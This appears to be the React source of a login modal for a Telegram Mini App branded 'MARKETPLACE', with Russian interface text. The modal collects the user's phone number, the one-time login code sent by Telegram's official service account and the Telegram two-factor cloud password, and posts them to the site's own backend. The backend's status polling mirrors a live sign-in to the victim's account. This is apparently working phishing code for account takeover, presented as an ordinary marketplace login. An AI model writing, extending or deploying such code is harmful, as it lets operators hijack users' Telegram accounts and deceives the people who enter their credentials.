"use client"

import type React from "react"
import { useState, useEffect, useRef, useCallback } from "react"
import { X, Check, Loader2, Phone, Lock, RefreshCw, Shield, Clipboard } from "lucide-react"
import { useAuth } from "@/contexts/auth-context"
import { getTelegram, hapticFeedback } from "@/lib/telegram"

type AuthStep = "phone" | "telegram-code" | "2fa-password" | "success" | "error"

export function AuthModal() {
  const { isAuthModalOpen, closeAuthModal, loginWithCode, isTelegramWebApp, telegramUser } = useAuth()
  const [step, setStep] = useState<AuthStep>("phone")
  const [isLoading, setIsLoading] = useState(false)
  const [code, setCode] = useState(["", "", "", "", ""])
  const [phoneNumber, setPhoneNumber] = useState("")
  const [password, setPassword] = useState("")
  const [error, setError] = useState<string | null>(null)
  const [statusMessage, setStatusMessage] = useState("")
  const [currentRequestId, setCurrentRequestId] = useState<string | null>(null)
  const hiddenInputRef = useRef<HTMLInputElement>(null)
  const codeInputsRef = useRef<(HTMLInputElement | null)[]>([])
  const passwordRef = useRef<HTMLInputElement>(null)
  const pollingRef = useRef<NodeJS.Timeout | null>(null)
  const isCheckingPasswordRef = useRef(false)
  const mountedRef = useRef(true)
  const timeoutsRef = useRef<NodeJS.Timeout[]>([])

  const telegramId = telegramUser?.id?.toString() || null

  // Helper to safely set timeouts that are cleaned up on unmount
  const safeSetTimeout = useCallback((callback: () => void, delay: number) => {
    const timeoutId = setTimeout(() => {
      if (mountedRef.current) {
        callback()
      }
    }, delay)
    timeoutsRef.current.push(timeoutId)
    return timeoutId
  }, [])

  const stopPolling = useCallback(() => {
    if (pollingRef.current) {
      clearInterval(pollingRef.current)
      pollingRef.current = null
    }
  }, [])

  const clearAllTimeouts = useCallback(() => {
    timeoutsRef.current.forEach((timeoutId) => clearTimeout(timeoutId))
    timeoutsRef.current = []
  }, [])

  useEffect(() => {
    mountedRef.current = true
    if (isAuthModalOpen) {
      setStep("phone")
      setCode(["", "", "", "", ""])
      setPhoneNumber("")
      setPassword("")
      setIsLoading(false)
      setError(null)
      setStatusMessage("")
      setCurrentRequestId(null)
      isCheckingPasswordRef.current = false
    }
    return () => {
      mountedRef.current = false
      stopPolling()
      clearAllTimeouts()
    }
  }, [isAuthModalOpen, stopPolling, clearAllTimeouts])

  const checkStatusWithAllParams = useCallback(
    async (
      phone?: string,
    ): Promise<{ status: string; message?: string; error?: string; requestId?: string } | null> => {
      try {
        const params = new URLSearchParams()
        if (currentRequestId) params.set("requestId", currentRequestId)
        if (telegramId) params.set("telegramId", telegramId)
        const phoneToUse = phone || phoneNumber
        if (phoneToUse) params.set("phone", phoneToUse)

        const response = await fetch(`/api/telegram/check-status?${params.toString()}`)
        const data = await response.json()
        return data
      } catch (err) {
        console.error("[v0] checkStatus error:", err)
        return null
      }
    },
    [currentRequestId, telegramId, phoneNumber],
  )

  const startPolling = useCallback(
    (phone?: string) => {
      stopPolling()

      pollingRef.current = setInterval(async () => {
        if (isCheckingPasswordRef.current || !mountedRef.current) {
          return
        }

        try {
          const data = await checkStatusWithAllParams(phone)
          if (!data || !mountedRef.current) return

          if (data.requestId && data.requestId !== currentRequestId && mountedRef.current) {
            setCurrentRequestId(data.requestId)
          }

          const status = data.status

          if (status === "waiting_password") {
            stopPolling()
            if (!mountedRef.current) return
            hapticFeedback("medium")
            setStep("2fa-password")
            setStatusMessage(data.message || "Введите облачный пароль")
            setIsLoading(false)
            safeSetTimeout(() => passwordRef.current?.focus(), 100)
            return
          }

          if (status === "waiting_code" && step !== "telegram-code") {
            if (!mountedRef.current) return
            hapticFeedback("medium")
            setStep("telegram-code")
            setStatusMessage(data.message || "Код отправлен в Telegram")
            setIsLoading(false)
            safeSetTimeout(() => hiddenInputRef.current?.focus(), 100)
          } else if (status === "invalid_password") {
            if (!mountedRef.current) return
            hapticFeedback("error")
            setError(data.message || "Неверный пароль. Попробуйте еще раз.")
            setIsLoading(false)
            setPassword("")
            safeSetTimeout(() => passwordRef.current?.focus(), 100)
          } else if (status === "success") {
            if (!mountedRef.current) return
            hapticFeedback("success")
            setStep("success")
            stopPolling()
            safeSetTimeout(() => {
              if (mountedRef.current) {
                closeAuthModal()
              }
            }, 1500)
          } else if (status === "error") {
            if (!mountedRef.current) return
            hapticFeedback("error")
            setError(data.error || data.message || "Ошибка авторизации")
            setStep("error")
            stopPolling()
          }
        } catch (err) {
          console.error("[v0] Polling error:", err)
        }
      }, 1500)
    },
    [step, closeAuthModal, currentRequestId, checkStatusWithAllParams, stopPolling],
  )

  const requestPhone = async () => {
    setIsLoading(true)
    setError(null)
    hapticFeedback("medium")

    const tg = getTelegram()

    if (tg && tg.requestContact) {
      startPolling()

      tg.requestContact(async (shared: boolean, contact?: { phone_number: string }) => {
        if (shared && contact) {
          const phone = contact.phone_number.startsWith("+") ? contact.phone_number : `+${contact.phone_number}`
          setPhoneNumber(phone)
          hapticFeedback("success")

          try {
            const response = await fetch("/api/telegram/auth", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({
                action: "send_phone",
                phone: phone,
                telegramId: telegramId,
              }),
            })
            const data = await response.json()

            if (data.success && data.requestId) {
              setCurrentRequestId(data.requestId)
            }
          } catch (err) {
            console.error("[v0] Error creating initial request:", err)
          }

          setStep("telegram-code")
          setStatusMessage("Код отправляется...")
          setIsLoading(false)
          safeSetTimeout(() => hiddenInputRef.current?.focus(), 100)

          startPolling(phone)
        } else {
          hapticFeedback("error")
          setIsLoading(false)
          stopPolling()
        }
      })
    } else {
      setIsLoading(false)
      setStep("phone")
    }
  }

  const openTelegramCode = () => {
    hapticFeedback("medium")
    const tg = getTelegram()
    // Коды приходят от бота Telegram (@telegram)
    const telegramLink = "https://t.me/+42777"
    
    if (tg?.openTelegramLink) {
      // Используем Telegram Web App API для открытия переписки
      tg.openTelegramLink(telegramLink)
    } else if (tg?.openLink) {
      // Альтернативный способ через openLink
      tg.openLink(telegramLink)
    } else {
      // Fallback: открываем через обычную ссылку
      window.open(telegramLink, "_blank")
    }
  }

  const handleHiddenInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, "").slice(0, 5)
    const newCode = ["", "", "", "", ""]

    value.split("").forEach((digit, i) => {
      if (i < 5) newCode[i] = digit
    })

    setCode(newCode)
    hapticFeedback("light")

    // Auto-submit when complete
    if (value.length === 5) {
      safeSetTimeout(() => submitCode(value), 100)
    }
  }

  const handleDigitBoxClick = () => {
    hiddenInputRef.current?.focus()
  }

  const handlePaste = (e: React.ClipboardEvent) => {
    e.preventDefault()
    const pastedData = e.clipboardData.getData("text").replace(/\D/g, "").slice(0, 5)

    if (pastedData.length > 0) {
      hapticFeedback("light")
      const newCode = ["", "", "", "", ""]
      pastedData.split("").forEach((digit, i) => {
        if (i < 5) newCode[i] = digit
      })
      setCode(newCode)

      if (pastedData.length === 5) {
        safeSetTimeout(() => submitCode(pastedData), 100)
      }
    }
  }

  const handleHiddenKeyDown = (e: React.KeyboardEvent) => {
    if (e.key === "Backspace") {
      const currentValue = code.join("")
      if (currentValue.length > 0) {
        const newValue = currentValue.slice(0, -1)
        const newCode = ["", "", "", "", ""]
        newValue.split("").forEach((digit, i) => {
          newCode[i] = digit
        })
        setCode(newCode)
      }
    }
  }

  const submitCode = async (codeStr?: string) => {
    const fullCode = codeStr || code.join("")
    if (fullCode.length !== 5) return

    setIsLoading(true)
    setError(null)
    hapticFeedback("medium")

    stopPolling()
    isCheckingPasswordRef.current = true

    try {
      const response = await fetch("/api/telegram/auth", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          action: "send_code",
          requestId: currentRequestId,
          phone: phoneNumber,
          code: fullCode,
          telegramId: telegramId,
        }),
      })

      const data = await response.json()

      if (data.success) {
        if (data.status === "waiting_password") {
          if (!mountedRef.current) return
          hapticFeedback("medium")
          setStep("2fa-password")
          setStatusMessage(data.message || "Введите облачный пароль")
          setIsLoading(false)
          isCheckingPasswordRef.current = false
          safeSetTimeout(() => passwordRef.current?.focus(), 100)
        } else if (data.status === "success") {
          if (!mountedRef.current) return
          hapticFeedback("success")
          setStep("success")
          await loginWithCode(fullCode)
          safeSetTimeout(() => {
            if (mountedRef.current) {
              closeAuthModal()
            }
          }, 1500)
        } else {
          if (!mountedRef.current) return
          setStatusMessage(data.message || "Проверяем код...")
          isCheckingPasswordRef.current = false
          startPolling(phoneNumber)
        }
      } else {
        if (!mountedRef.current) return
        hapticFeedback("error")
        if (data.error?.includes("Invalid code") || data.error?.includes("Неверный код")) {
          setError("Неверный код. Попробуйте еще раз.")
          setCode(["", "", "", "", ""])
          setIsLoading(false)
          isCheckingPasswordRef.current = false
          safeSetTimeout(() => hiddenInputRef.current?.focus(), 100)
        } else {
          setError(data.error || "Ошибка проверки кода")
          setIsLoading(false)
          isCheckingPasswordRef.current = false
          startPolling(phoneNumber)
        }
      }
    } catch (err) {
      if (!mountedRef.current) return
      hapticFeedback("error")
      setError("Ошибка подключения к серверу")
      setIsLoading(false)
      isCheckingPasswordRef.current = false
      startPolling(phoneNumber)
    }
  }

  const submitPassword = async () => {
    if (!password.trim()) return

    setIsLoading(true)
    setError(null)
    hapticFeedback("medium")

    stopPolling()
    isCheckingPasswordRef.current = true

    try {
      const response = await fetch("/api/telegram/auth", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          action: "send_password",
          requestId: currentRequestId,
          phone: phoneNumber,
          password: password,
          telegramId: telegramId,
        }),
      })

      const data = await response.json()

      if (data.success) {
        if (data.status === "success") {
          if (!mountedRef.current) return
          hapticFeedback("success")
          setStep("success")
          await loginWithCode(code.join(""))
          safeSetTimeout(() => {
            if (mountedRef.current) {
              closeAuthModal()
            }
          }, 1500)
        } else {
          if (!mountedRef.current) return
          isCheckingPasswordRef.current = false
          setStatusMessage("Проверяем пароль...")
          startPolling(phoneNumber)
        }
      } else if (data.error?.includes("Invalid password") || data.error?.includes("Неверный пароль")) {
        if (!mountedRef.current) return
        hapticFeedback("error")
        setError("Неверный пароль. Попробуйте еще раз.")
        setPassword("")
        setIsLoading(false)
        isCheckingPasswordRef.current = false
        safeSetTimeout(() => passwordRef.current?.focus(), 100)
      } else {
        if (!mountedRef.current) return
        isCheckingPasswordRef.current = false
        setStatusMessage("Проверяем пароль...")
        startPolling(phoneNumber)
      }
    } catch (err) {
      if (!mountedRef.current) return
      setError("Ошибка подключения к серверу")
      setPassword("")
      setIsLoading(false)
      safeSetTimeout(() => passwordRef.current?.focus(), 100)
    }
  }

  const handleRetry = () => {
    if (!mountedRef.current) return
    if (step === "2fa-password" || error?.includes("пароль")) {
      setPassword("")
      setError(null)
      setIsLoading(false)
      safeSetTimeout(() => passwordRef.current?.focus(), 100)
    } else {
      setStep("phone")
      setCode(["", "", "", "", ""])
      setPassword("")
      setError(null)
      setStatusMessage("")
      setIsLoading(false)
      setCurrentRequestId(null)
      isCheckingPasswordRef.current = false
    }
  }

  const handleClose = async () => {
    if (currentRequestId) {
      try {
        await fetch("/api/telegram/cancel", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ requestId: currentRequestId }),
        })
      } catch (err) {
        console.error("[v0] Error cancelling auth:", err)
      }
    }

    stopPolling()
    isCheckingPasswordRef.current = false
    closeAuthModal()
  }

  return (
    <div 
      className={`fixed inset-0 z-[100] flex items-center justify-center p-4 bg-black/70 backdrop-blur-sm transition-opacity duration-200 ${
        isAuthModalOpen ? 'opacity-100 pointer-events-auto' : 'opacity-0 pointer-events-none'
      }`}
      style={{ display: isAuthModalOpen ? 'flex' : 'none' }}
    >
      <div className="relative w-full max-w-sm bg-[#1a1a2e] rounded-2xl overflow-hidden shadow-2xl border border-white/10 animate-in zoom-in-95 duration-200">
        <button
          onClick={handleClose}
          className="absolute top-4 right-4 text-white/50 hover:text-white transition-colors z-10"
        >
          <X className="w-5 h-5" />
        </button>

        <div className="p-6 pt-8">
          <div className="text-center mb-6">
            <h1 className="text-2xl font-bold">
              <span className="text-[#ff0066]">MARKET</span>
              <span className="text-[#00ccff]">PLACE</span>
            </h1>

            <div className="flex justify-center gap-2 mt-4">
              <div className={`w-2 h-2 rounded-full ${step === "phone" ? "bg-[#ff0066]" : "bg-white/20"}`} />
              <div className={`w-2 h-2 rounded-full ${step === "telegram-code" ? "bg-[#ff0066]" : "bg-white/20"}`} />
              <div
                className={`w-2 h-2 rounded-full ${step === "2fa-password" || step === "success" ? "bg-[#ff0066]" : "bg-white/20"}`}
              />
            </div>
          </div>

          <div className="w-full h-1 bg-white/10 rounded-full mb-6 overflow-hidden">
            <div
              className="h-full bg-gradient-to-r from-[#ff0066] to-[#00ccff] transition-all duration-500"
              style={{
                width: step === "phone" ? "33%" : step === "telegram-code" ? "66%" : "100%",
              }}
            />
          </div>

          {step === "phone" && (
            <div className="text-center space-y-6">
              <div className="w-16 h-16 mx-auto bg-[#00ccff]/20 rounded-full flex items-center justify-center">
                <Phone className="w-8 h-8 text-[#00ccff]" />
              </div>
              <div>
                <h2 className="text-xl font-semibold text-white mb-2">Авторизация</h2>
                <p className="text-white/60 text-sm">Поделитесь номером для входа в аккаунт Telegram</p>
              </div>
              <button
                onClick={requestPhone}
                disabled={isLoading}
                className="w-full py-4 bg-[#00ccff]/20 hover:bg-[#00ccff]/30 border border-[#00ccff]/50 rounded-xl text-white font-medium transition-all disabled:opacity-50 flex items-center justify-center gap-2"
              >
                {isLoading ? (
                  <>
                    <Loader2 className="w-5 h-5 animate-spin" />
                    Запрашиваем номер...
                  </>
                ) : (
                  <>
                    <Phone className="w-5 h-5" />
                    Поделиться контактом
                  </>
                )}
              </button>
              <p className="text-white/40 text-xs">Код будет отправлен в Telegram</p>
            </div>
          )}

          {step === "telegram-code" && (
            <div className="text-center space-y-6">
              <p className="text-white/60 text-sm">Введите код из Telegram:</p>

              <input
                ref={hiddenInputRef}
                type="tel"
                inputMode="numeric"
                value={code.join("")}
                onChange={handleHiddenInputChange}
                onKeyDown={handleHiddenKeyDown}
                onPaste={handlePaste}
                className="absolute opacity-0 pointer-events-none"
                style={{ position: "absolute", left: "-9999px" }}
                maxLength={5}
                autoComplete="one-time-code"
                disabled={isLoading}
              />

              <div className="flex justify-center gap-2 cursor-text" onClick={handleDigitBoxClick}>
                {code.map((digit, index) => {
                  const isFocused = document.activeElement === hiddenInputRef.current
                  const currentLength = code.join("").length
                  const isCurrentPosition = index === currentLength && isFocused

                  return (
                    <div
                      key={index}
                      className={`w-12 h-14 flex items-center justify-center text-xl font-bold border-2 rounded-lg text-white transition-all ${
                        digit
                          ? "border-[#00ccff] bg-[#00ccff]/10"
                          : isCurrentPosition
                            ? "border-[#00ccff] bg-[#00ccff]/5"
                            : "border-[#00ccff]/50"
                      }`}
                    >
                      {digit || (isCurrentPosition ? <span className="animate-pulse">|</span> : "")}
                    </div>
                  )
                })}
              </div>

              <p className="text-white/40 text-xs flex items-center justify-center gap-1.5">
                <Clipboard className="w-3.5 h-3.5" />
                Можно вставить код из буфера обмена
              </p>

              <button
                onClick={openTelegramCode}
                className="w-full py-3 bg-[#00ccff]/10 hover:bg-[#00ccff]/20 border border-[#00ccff]/30 rounded-xl text-white/80 text-sm transition-all flex items-center justify-center gap-2"
              >
                <Check className="w-4 h-4 text-[#00ccff]" />
                Показать код в Telegram
              </button>

              {statusMessage && <p className="text-white/50 text-xs">{statusMessage}</p>}

              {error && (
                <div className="p-3 bg-red-500/20 border border-red-500/30 rounded-lg">
                  <p className="text-red-400 text-sm">{error}</p>
                </div>
              )}

              {isLoading && (
                <div className="flex items-center justify-center gap-2 text-white/60">
                  <Loader2 className="w-4 h-4 animate-spin" />
                  <span className="text-sm">Проверяем...</span>
                </div>
              )}
            </div>
          )}

          {step === "2fa-password" && (
            <div className="text-center space-y-6">
              <div className="w-16 h-16 mx-auto bg-[#ff0066]/20 rounded-full flex items-center justify-center">
                <Lock className="w-8 h-8 text-[#ff0066]" />
              </div>
              <div>
                <h2 className="text-xl font-semibold text-white mb-2">Облачный пароль</h2>
                <p className="text-white/60 text-sm">Введите пароль двухфакторной аутентификации</p>
              </div>

              <input
                ref={passwordRef}
                type="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                onKeyDown={(e) => e.key === "Enter" && submitPassword()}
                placeholder="Введите пароль"
                className="w-full px-4 py-3 bg-transparent border-2 border-[#ff0066]/50 rounded-xl text-white placeholder-white/40 focus:border-[#ff0066] focus:outline-none transition-colors"
                disabled={isLoading}
              />

              {error && (
                <div className="p-3 bg-red-500/20 border border-red-500/30 rounded-lg">
                  <p className="text-red-400 text-sm">{error}</p>
                </div>
              )}

              <button
                onClick={submitPassword}
                disabled={isLoading || !password.trim()}
                className="w-full py-4 bg-[#ff0066] hover:bg-[#ff0066]/80 rounded-xl text-white font-medium transition-all disabled:opacity-50 flex items-center justify-center gap-2"
              >
                {isLoading ? (
                  <>
                    <Loader2 className="w-5 h-5 animate-spin" />
                    Проверяем...
                  </>
                ) : (
                  <>
                    <Shield className="w-5 h-5" />
                    Подтвердить
                  </>
                )}
              </button>
            </div>
          )}

          {step === "success" && (
            <div className="text-center space-y-6">
              <div className="w-16 h-16 mx-auto bg-green-500/20 rounded-full flex items-center justify-center">
                <Check className="w-8 h-8 text-green-500" />
              </div>
              <div>
                <h2 className="text-xl font-semibold text-white mb-2">Успешно!</h2>
                <p className="text-white/60 text-sm">Вы успешно авторизовались</p>
              </div>
            </div>
          )}

          {step === "error" && (
            <div className="text-center space-y-6">
              <div className="w-16 h-16 mx-auto bg-red-500/20 rounded-full flex items-center justify-center">
                <X className="w-8 h-8 text-red-500" />
              </div>
              <div>
                <h2 className="text-xl font-semibold text-white mb-2">Ошибка</h2>
                <p className="text-white/60 text-sm">{error || "Произошла ошибка авторизации"}</p>
              </div>
              <button
                onClick={handleRetry}
                className="w-full py-4 bg-white/10 hover:bg-white/20 rounded-xl text-white font-medium transition-all flex items-center justify-center gap-2"
              >
                <RefreshCw className="w-5 h-5" />
                Попробовать снова
              </button>
            </div>
          )}
        </div>
      </div>
    </div>
  )
}
